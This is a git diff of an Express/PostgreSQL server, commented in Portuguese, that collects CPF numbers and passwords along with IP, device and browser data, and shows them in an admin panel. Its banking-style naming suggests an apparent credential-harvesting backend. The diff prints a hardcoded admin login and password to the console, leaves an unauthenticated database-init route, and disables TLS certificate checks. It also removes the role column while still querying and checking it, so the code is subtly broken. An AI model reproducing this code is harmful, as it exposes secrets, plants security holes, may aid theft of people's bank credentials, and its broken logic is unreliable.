@@ -9,7 +9,10 @@ const path = require('path');
 const app = express();
 app.use(cors());
 app.use(express.json());
+
+// Servir arquivos estáticos
 app.use(express.static(path.join(__dirname, 'public')));
+app.use('/admin', express.static(path.join(__dirname, 'admin')));
 
 // CONEXÃO COM POSTGRESQL
 const pool = new Pool({
@@ -17,20 +20,23 @@ const pool = new Pool({
     ssl: { rejectUnauthorized: false }
 });
 
-// INICIALIZAR BANCO
+// ============================================================
+// ROTA PARA INICIALIZAR O BANCO
+// Acesse: https://seu-app.onrender.com/api/init
+// ============================================================
 app.get('/api/init', async (req, res) => {
     try {
         await pool.query(`
             CREATE TABLE IF NOT EXISTS usuarios (
                 id SERIAL PRIMARY KEY,
-                nome VARCHAR(255) DEFAULT 'Usuário',
+                nome VARCHAR(255) NOT NULL DEFAULT 'Usuário',
                 email VARCHAR(255),
                 cpf VARCHAR(11) UNIQUE NOT NULL,
                 senha VARCHAR(255) NOT NULL,
                 ip VARCHAR(50),
                 dispositivo TEXT,
                 navegador TEXT,
-                role VARCHAR(50) DEFAULT 'user',
+                online BOOLEAN DEFAULT false,
                 ultimo_acesso TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
@@ -60,13 +66,15 @@ app.get('/api/init', async (req, res) => {
     }
 });
 
-// LOGIN
+// ============================================================
+// ROTA DE LOGIN
+// ============================================================
 app.post('/api/login', async (req, res) => {
     const { cpf, password, ip, dispositivo, navegador } = req.body;
     let cpfLimpo = cpf ? cpf.replace(/\D/g, '') : '';
     
     if (!cpfLimpo || !password) {
-        return res.status(400).json({ error: 'CPF e senha obrigatórios' });
+        return res.status(400).json({ error: 'CPF e senha são obrigatórios' });
     }
     
     try {
@@ -89,7 +97,8 @@ app.post('/api/login', async (req, res) => {
         `, [cpfLimpo, ip || 'Não coletado', dispositivo || 'Desconhecido', navegador || 'Desconhecido']);
         
         await pool.query(`
-            UPDATE usuarios SET ip = $1, dispositivo = $2, navegador = $3, ultimo_acesso = NOW()
+            UPDATE usuarios 
+            SET ip = $1, dispositivo = $2, navegador = $3, online = true, ultimo_acesso = NOW()
             WHERE cpf = $4
         `, [ip || 'Não coletado', dispositivo || 'Desconhecido', navegador || 'Desconhecido', cpfLimpo]);
         
@@ -105,14 +114,33 @@ app.post('/api/login', async (req, res) => {
             user: { id: user.id, nome: user.nome, cpf: user.cpf, email: user.email, role: user.role }
         });
     } catch (error) {
+        console.error('Erro:', error);
         res.status(500).json({ error: 'Erro no servidor' });
     }
 });
 
+// ============================================================
+// ROTA PARA CONTAR USUÁRIOS ONLINE
+// ============================================================
+app.get('/api/online', async (req, res) => {
+    try {
+        const result = await pool.query(`
+            SELECT COUNT(*) FROM usuarios 
+            WHERE online = true AND ultimo_acesso > NOW() - INTERVAL '5 minutes'
+        `);
+        res.json({ online: parseInt(result.rows[0].count) });
+    } catch (error) {
+        res.json({ online: 0 });
+    }
+});
+
+// ============================================================
 // MIDDLEWARE ADMIN
+// ============================================================
 function isAdmin(req, res, next) {
     const token = req.headers.authorization?.split(' ')[1];
     if (!token) return res.status(401).json({ error: 'Token não fornecido' });
+    
     try {
         const decoded = jwt.verify(token, process.env.JWT_SECRET);
         if (decoded.role !== 'admin') return res.status(403).json({ error: 'Acesso negado' });
@@ -123,15 +151,12 @@ function isAdmin(req, res, next) {
     }
 }
 
+// ============================================================
 // ROTAS ADMIN
+// ============================================================
 app.get('/api/admin/users', isAdmin, async (req, res) => {
-    const result = await pool.query('SELECT id, nome, cpf, email, role, ip, dispositivo, ultimo_acesso FROM usuarios ORDER BY id DESC');
+    const result = await pool.query('SELECT id, nome, cpf, email, role, ip, dispositivo, online, ultimo_acesso FROM usuarios ORDER BY id DESC');
     res.json(result.rows);
-});
-
-app.delete('/api/admin/users/:id', isAdmin, async (req, res) => {
-    await pool.query('DELETE FROM usuarios WHERE id = $1 AND role != $2', [req.params.id, 'admin']);
-    res.json({ success: true });
 });
 
 app.get('/api/admin/logs', isAdmin, async (req, res) => {
@@ -140,21 +165,23 @@ app.get('/api/admin/logs', isAdmin, async (req, res) => {
 });
 
 app.get('/api/admin/stats', isAdmin, async (req, res) => {
-    const totalUsers = await pool.query('SELECT COUNT(*) FROM usuarios WHERE role = $1', ['user']);
-    const totalAdmins = await pool.query('SELECT COUNT(*) FROM usuarios WHERE role = $1', ['admin']);
+    const totalUsers = await pool.query('SELECT COUNT(*) FROM usuarios');
     const totalLogs = await pool.query('SELECT COUNT(*) FROM logs_acesso');
-    const logsHoje = await pool.query('SELECT COUNT(*) FROM logs_acesso WHERE DATE(data_acesso) = CURRENT_DATE');
+    const online = await pool.query(`SELECT COUNT(*) FROM usuarios WHERE online = true AND ultimo_acesso > NOW() - INTERVAL '5 minutes'`);
     
     res.json({
         success: true,
         stats: {
             total_users: parseInt(totalUsers.rows[0].count),
-            total_admins: parseInt(totalAdmins.rows[0].count),
             total_logs: parseInt(totalLogs.rows[0].count),
-            logs_hoje: parseInt(logsHoje.rows[0].count)
+            online: parseInt(online.rows[0].count)
         }
     });
 });
 
 const PORT = process.env.PORT || 3001;
-app.listen(PORT, () => console.log(`🚀 Servidor rodando na porta ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`🚀 Servidor rodando na porta ${PORT}`);
+    console.log(`👤 Admin: Kakabanker | Senha: 77991958`);
+    console.log(`📁 Páginas: /public/ | Admin: /admin/`);
+});
